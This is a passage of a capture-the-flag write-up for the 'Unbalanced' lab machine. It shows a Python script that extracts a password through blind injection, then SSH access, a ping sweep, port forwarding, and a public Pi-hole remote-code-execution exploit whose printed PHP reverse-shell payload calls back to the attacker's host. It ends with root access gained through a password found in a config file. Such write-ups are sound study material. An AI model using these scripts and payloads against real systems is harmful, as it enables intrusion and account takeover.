<div class="paragraph">
<p>And it does exist but this time, when you go to <span style="color:orange"><strong><code>/intranet.php</code></strong></span> and try to login, an error message now appears which was not apparent in the other hosted applications.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/intranet_host1_login.png" alt="host1">
</div>
<div class="title">Figure 3. <span style="color:orange">Error Message: Invalid credentials.</span></div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-3-exploitation">PART 3 : EXPLOITATION</h2>
<div class="sectionbody">
<div class="paragraph">
<p>After testing a simple SQL injection payload like <span style="color:orange"><strong><code>' or '1'='1</code></strong></span>, the form seems to be vulnerable as it returns a list of users and their respective roles. It is important to note that the form rejects capital letters so <span style="color:orange"><strong><code>' OR '1'='1</code></strong></span> will not work. Comment characters also seem to be rejected.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/intranet_host1_sqli.png" alt="SQL Injection">
</div>
<div class="title">Figure 4. <span style="color:orange">User list</span></div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Since we have an error message and given the limitations of the form, maybe it could be leveraged to extract passwords for the listed users. I&#8217;ll focus on <span style="color:orange">bryan</span> since he has the role of <span style="color:orange">System Administrator</span>.</p>
</div>
<div class="paragraph">
<p>I wrote another python script for this:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">"http://172.31.179.1/intranet.php"</span>
<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"http"</span><span class="p">:</span> <span class="s">"http://10.10.10.200:3128"</span> <span class="p">}</span>

<span class="n">char_set</span> <span class="o">=</span> <span class="s">"abcdefghihjklmnopqrstuvwxyz0123456789!@$</span><span class="si">%</span><span class="s">^&amp;*()=_+,./&lt;&gt;?:"</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">char_set</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">"Username"</span><span class="p">:</span> <span class="s">"bryan"</span><span class="p">,</span>
            <span class="s">"Password"</span><span class="p">:</span> <span class="s">"' or substring(Password,{},1)='{}' or '"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

        <span class="k">if</span> <span class="s">"bryan@unbalanced.htb"</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">password</span> <span class="o">+=</span> <span class="n">i</span>
            <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
            <span class="k">break</span>

    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">char_set</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span> <span class="k">break</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python3 intranet.py

  i
  ir
  ire
  irea
  ireal
  ireall
  ireally
  ireallyl
  ireallyl0
  ireallyl0v
  ireallyl0ve
  ireallyl0veb
  ireallyl0vebu
  ireallyl0vebub
  ireallyl0vebubb
  ireallyl0vebubbl
  ireallyl0vebubble
  ireallyl0vebubbleg
  ireallyl0vebubblegu
  ireallyl0vebubblegum
  ireallyl0vebubblegum!
  ireallyl0vebubblegum!!
  <span class="c"><mark>ireallyl0vebubblegum!!!</mark></span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Checking to see if the password works:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/intranet_host1_bryan.png" alt="bryan">
</div>
<div class="title">Figure 5. <span style="color:orange">Successful login as bryan</span></div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>And it does!</p>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-3-generate-user-shell-bryan">PART 3 : GENERATE USER SHELL (bryan)</h2>
<div class="sectionbody">
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>ssh <span class="nt">-l</span> bryan 10.10.10.200

  The authenticity of host <span class="s1">'10.10.10.200 (10.10.10.200)'</span> can<span class="se">\'</span>t be established.
  ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
  Are you sure you want to <span class="k">continue </span>connecting <span class="o">(</span><span class="nb">yes</span>/no/[fingerprint]<span class="o">)</span>? <span class="nb">yes
  </span>Warning: Permanently added <span class="s1">'10.10.10.200'</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
  bryan@10.10.10.200<span class="se">\'</span>s password: ireallyl0vebubblegum!!!

<span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>

  <span class="nt">-rw-r--r--</span> 1 bryan bryan  798 Jun 17 11:35 TODO
  <span class="nt">-rw-r--r--</span> 1 root  root    33 Dec  5 14:18 user.txt</code></pre>
</div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-3-privilege-escalation-bryan-root">PART 3 : PRIVILEGE ESCALATION (bryan &#8594; root)</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Examining the TODO file in bryan&#8217;s home directory:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span><span class="nb">cat </span>TODO

  <span class="c">############</span>
  <span class="c"># Intranet #</span>
  <span class="c">############</span>
  <span class="k">*</span> Install new intranet-host3 docker <span class="o">[</span>DONE]
  <span class="k">*</span> Rewrite the intranet-host3 code to fix Xpath vulnerability <span class="o">[</span>DONE]
  <span class="k">*</span> Test intranet-host3 <span class="o">[</span>DONE]
  <span class="k">*</span> Add intranet-host3 to load balancer <span class="o">[</span>DONE]
  <span class="k">*</span> Take down intranet-host1 and intranet-host2 from load balancer <span class="o">(</span><span class="nb">set </span>as quiescent, weight zero<span class="o">)</span> <span class="o">[</span>DONE]
  <span class="k">*</span> Fix intranet-host2 <span class="o">[</span>DONE]
  <span class="k">*</span> Re-add intranet-host2 to load balancer <span class="o">(</span><span class="nb">set </span>default weight<span class="o">)</span> <span class="o">[</span>DONE]
  - Fix intranet-host1 <span class="o">[</span>TODO]
  - Re-add intranet-host1 to load balancer <span class="o">(</span><span class="nb">set </span>default weight<span class="o">)</span> <span class="o">[</span>TODO]

  <span class="c">###########</span>
  <span class="c"># Pi-hole #</span>
  <span class="c">###########</span>
  <span class="k">*</span> Install Pi-hole docker <span class="o">(</span>only listening on 127.0.0.1<span class="o">)</span> <span class="o">[</span>DONE]
  <span class="k">*</span> Set temporary admin password <span class="o">[</span>DONE]
  <span class="k">*</span> Create Pi-hole configuration script <span class="o">[</span>IN PROGRESS]
  - Run Pi-hole configuration script <span class="o">[</span>TODO]
  - Expose Pi-hole ports to the network <span class="o">[</span>TODO]</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The file basically confirms the path to user where intranet-host1 is being troubleshooted but the important thing here is that there is a <span style="color:orange">Pi-hole service</span> running but is only available locally. It uses a temporary password so it&#8217;s probably insecure and new credentials may probably be found in the configuration script being created as of the moment.</p>
</div>
<div class="paragraph">
<p>Checking to see what we can connect to locally:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span>ss <span class="nt">-plnt</span> | <span class="nb">grep </span>127.0.0.1

  LISTEN    0         128              <span class="c"><mark>127.0.0.1:8080</mark>             0.0.0.0:*</span>
  LISTEN    0         128              127.0.0.1:5553             0.0.0.0:<span class="k">*</span>

<span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span>curl <a href="http://127.0.0.1:8080/" class="bare">http://127.0.0.1:8080/</a>

  <span class="o">[</span>ERROR]: Unable to parse results from &lt;i&gt;queryads.php&lt;/i&gt;: &lt;code&gt;Unhandled error message <span class="o">(</span>&lt;code&gt;Invalid domain!&lt;/code&gt;<span class="o">)</span>&lt;/code&gt;</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>There is an error when trying to access the service running at port 8080 locally but according to this <a href="https://www.reddit.com/r/pihole/comments/ca9d45/problems_with_admin_interface_on_docker/" target="_blank" rel="noopener">Reddit thread</a>, it seems like you can go directly to <span style="color:orange">/admin/</span>.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span>curl <span class="nt">-I</span> <a href="http://127.0.0.1:8080/admin/" class="bare">http://127.0.0.1:8080/admin/</a>

  HTTP/1.1 200 OK
  X-Pi-hole: The Pi-hole Web interface is working!
  X-Frame-Options: DENY
  Set-Cookie: <span class="c"><mark>PHPSESSID=icng7lp4cktfauu6lt26inrot0; path=/</mark></span>
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
  Date: Sun, 06 Dec 2020 00:09:08 GMT
  Server: lighttpd/1.4.45</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The Pi-hole service can now be reached! However, it&#8217;s running via docker so I decided to look for an IP it might be running from and maybe access it via Squid Proxy. Looking back into the file, squid.conf:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span><span class="nb">cat </span>squid.conf | <span class="nb">grep </span>dst

  acl intranet dstdomain <span class="nt">-n</span> intranet.unbalanced.htb
  <span class="c"><mark>acl intranet_net dst -n 172.16.0.0/12</mark></span>

<span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span><span class="nb">cat </span>squid.conf | <span class="nb">grep </span>intranet_net

  acl intranet_net dst <span class="nt">-n</span> 172.16.0.0/12
  <span class="c"><mark>http_access allow intranet_net</mark></span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p><span style="color:orange">Access to the IP range 172.16.0.0/12 (172.16.0.0 – 172.31.255.255) is allowed</span> via the proxy and checking the interfaces available to the machine, I decided to do a ping sweep in the IP range, 172.31.0.1/16.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span>ip a | <span class="nb">grep</span> <span class="s2">"inet "</span>

  inet 127.0.0.1/8 scope host lo
  inet 10.10.10.200/24 brd 10.10.10.255 scope global ens160
  inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
  <span class="c"><mark>inet 172.31.0.1/16 brd 172.31.255.255 scope global br-742fc4eb92b1</mark></span>

<span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>y <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c1</span> 172.31.<span class="nv">$x</span>.<span class="nv">$y</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">"bytes from"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done

  </span>64 bytes from <span class="c"><mark>172.31.11.3</mark>: icmp_seq=1 ttl=64 time=0.248 ms</span>
  64 bytes from 172.31.179.2: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.175 ms
  64 bytes from 172.31.179.3: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.148 ms
  64 bytes from 172.31.179.1: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.122 ms</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Aside from the previous intranet hosts, there is a new host identified --<span style="color:orange">172.31.11.3</span>. Trying to access it via Squid Proxy leads you to:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/pi-hole_landing_page.png" alt="Pi-hole Landing Page">
</div>
<div class="title">Figure 6. <span style="color:orange">Pi-hole Landing Page</span></div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Now going to the login page, and remembering that a temporary password is set for the admin account, I tried <span style="color:orange">"admin"</span> and it went through but there is not much to do so I search also for an exploit for the current version of Pi-hole being run.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/pi-hole_login.png" alt="Pi-hole Login Page">
</div>
<div class="title">Figure 7. <span style="color:orange">Pi-hole Login Page</span></div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/pi-hole_admin_panel.png" alt="Pi-hole Admin Panel">
</div>
<div class="title">Figure 8. <span style="color:orange">Pi-hole Admin Panel</span></div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/pi-hole_version.png" alt="Pi-hole Version">
</div>
<div class="title">Figure 9. <span style="color:orange">Pi-hole Version</span></div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Looking for exploits:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>searchsploit pi-hole

  searchsploit pi-hole
  <span class="nt">-------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
   Exploit Title                                                                       |  Path
  <span class="nt">-------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
  Pi-Hole - heisenbergCompensator Blocklist OS Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>          | php/remote/48491.rb
  <span class="c"><mark>Pi-hole 4.3.2 - Remote Code Execution (Authenticated)                                | python/webapps/48727.py</mark></span>
  Pi-hole 4.4.0 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                                | linux/webapps/48519.py
  Pi-hole &lt; 4.4 - Authenticated Remote Code Execution                                  | linux/webapps/48442.py
  Pi-hole &lt; 4.4 - Authenticated Remote Code Execution / Privileges Escalation          | linux/webapps/48443.py
  Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scripting <span class="k">in </span>Whitelist/Blacklist | linux/webapps/40249.txt
  <span class="nt">-------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
  Shellcodes: No Results

<span class="nv">$ </span>searchsploit <span class="nt">-m</span> python/webapps/48727.py

<span class="nv">$ </span>python 48727.py

  ╔═╗┬ ┬┌┐┌  ╔═╗┬┬ ┬┌─┐┬  ┌─┐
  ╠═╝││││││  ╠═╝│├─┤│ ││  ├┤
  ╩  └┴┘┘└┘  ╩  ┴┴ ┴└─┘┴─┘└─┘
        by @CyberVaca

  usage: 48727.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="nt">-u</span> URL <span class="nt">-p</span> PORT <span class="nt">-i</span> IP <span class="nt">-pass</span> PASSWORD
  48727.py: error: argument <span class="nt">-u</span> is required</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Setting up the exploit&#8201;&#8212;&#8201;I forwarded the locally available service inside the machine since HTTP proxies are very unreliable when establishing reverse shells afterwhich I setup a listener via <code>netcat</code> in my machine:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>sshpass <span class="nt">-p</span> <span class="s1">'ireallyl0vebubblegum!!!'</span> ssh <span class="nt">-l</span> bryan <span class="nt">-L</span> 8080:127.0.0.1:8080 <span class="nt">-f</span> <span class="nt">-N</span> 10.10.10.200

<span class="nv">$ </span>nc <span class="nt">-lvp</span> 4444

  listening on <span class="o">[</span>any] 4444 ...</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Then I ran the exploit:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python 48727.py <span class="nt">-u</span> <a href="http://127.0.0.1:8080" class="bare">http://127.0.0.1:8080</a> <span class="nt">-p</span> 4444 <span class="nt">-i</span> 10.10.14.11 <span class="nt">-pass</span> admin

  ╔═╗┬ ┬┌┐┌  ╔═╗┬┬ ┬┌─┐┬  ┌─┐
  ╠═╝││││││  ╠═╝│├─┤│ ││  ├┤
  ╩  └┴┘┘└┘  ╩  ┴┴ ┴└─┘┴─┘└─┘
        by @CyberVaca

  <span class="o">[</span>] Token: TYiXiwh9ctRRTAHZ/5bZz/HX3vfihy6jvq8BYk1yb9w=
  [] Payload: php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("10.10.14.11", 4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
  <span class="o">[</span>+] Sending Payload...</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Going back to the listener:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">id

  </span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>

<span class="nv">$ </span><span class="nb">hostname

  </span>pihole.unbalanced.htb

<span class="nv">$ </span><span class="nb">cd</span> /root

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>

  <span class="nt">-rw-r--r--</span> 1 root root 113876 Sep 20  2019 ph_install.sh
  <span class="nt">-rw-r--r--</span> 1 root root    485 Apr  6  2020 pihole_config.sh

<span class="nv">$ </span><span class="nb">cat </span>pihole_config.sh

  <span class="se">#</span><span class="o">!</span>/bin/bash

  <span class="c"># Add domains to whitelist</span>
  /usr/local/bin/pihole <span class="nt">-w</span> unbalanced.htb
  /usr/local/bin/pihole <span class="nt">-w</span> rebalanced.htb

  <span class="c"># Set temperature unit to Celsius</span>
  /usr/local/bin/pihole <span class="nt">-a</span> <span class="nt">-c</span>

  <span class="c"># Add local host record</span>
  /usr/local/bin/pihole <span class="nt">-a</span> hostrecord pihole.unbalanced.htb 127.0.0.1

  <span class="c"># Set privacy level</span>
  /usr/local/bin/pihole <span class="nt">-a</span> <span class="nt">-l</span> 4

  <span class="c"># Set web admin interface password</span>
  /usr/local/bin/pihole <span class="nt">-a</span> <span class="nt">-p</span> <span class="s1">'<mark>bUbBl3gUm$43v3Ry0n3!</mark>'</span>

  <span class="c"># Set admin email</span>
  /usr/local/bin/pihole <span class="nt">-a</span> email <a href="mailto:admin@unbalanced.htb">admin@unbalanced.htb</a></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The <code>/root</code> directory is readable and in there is the Pi-hole config file mentioned earlier. A new password is visible and maybe this could be used to <code>su</code> to root:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span style="color:green">bryan@unbalanced</span>:<span style="color:#779ECB">~</span><span class="nv">$ </span>su -

  Password: bUbBl3gUm<span class="nv">$43v3Ry0n3</span><span class="o">!</span>

<span style="color:green">root@unbalanced</span>:<span style="color:#779ECB">~</span># <span class="nb">id

  </span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>

<span style="color:green">root@unbalanced</span>:<span style="color:#779ECB">~</span># <span class="nb">ls</span> <span class="nt">-l</span>

  <span class="nt">-rw-------</span> 1 root root 33 Dec  5 14:18 root.txt</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>And now, we have root!</p>
</div>
</div>
</div></section>
       </div>
    </div>

    <script>
      function openNav() {
        document.getElementById("sidebar").style.width = "250px";
        document.getElementById("content").style.marginLeft = "250px";
      }
      function closeNav() {
        document.getElementById("sidebar").removeAttribute("style");
        document.getElementById("content").removeAttribute("style");
      } 
    </script>

    
      <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'true', 'auto');
        ga('send', 'pageview');
      </script>
    
  </body>
</html>
